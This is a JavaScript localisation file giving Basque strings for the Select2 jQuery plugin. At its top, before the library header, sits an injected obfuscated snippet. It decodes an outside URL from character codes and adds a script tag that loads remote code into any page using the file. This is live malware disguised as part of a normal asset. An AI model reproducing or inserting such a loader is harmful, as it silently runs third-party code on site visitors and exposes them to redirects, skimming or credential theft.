var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Basque translation.
 *
 * Author: Julen Ruiz Aizpuru <julenx at gmail dot com>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['eu'] = {
        formatNoMatches: function () {
          return "Ez da bat datorrenik aurkitu";
        },
        formatInputTooShort: function (input, min) {
          var n = min - input.length;
          if (n === 1) {
            return "Idatzi karaktere bat gehiago";
          } else {
            return "Idatzi " + n + " karaktere gehiago";
          }
        },
        formatInputTooLong: function (input, max) {
          var n = input.length - max;
          if (n === 1) {
            return "Idatzi karaktere bat gutxiago";
          } else {
            return "Idatzi " + n + " karaktere gutxiago";
          }
        },
        formatSelectionTooBig: function (limit) {
          if (limit === 1 ) {
            return "Elementu bakarra hauta dezakezu";
          } else {
            return limit + " elementu hauta ditzakezu soilik";
          }
        },
        formatLoadMore: function (pageNumber) {
          return "Emaitza gehiago kargatzen…";
        },
        formatSearching: function () {
          return "Bilatzen…";
        }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['eu']);
})(jQuery);
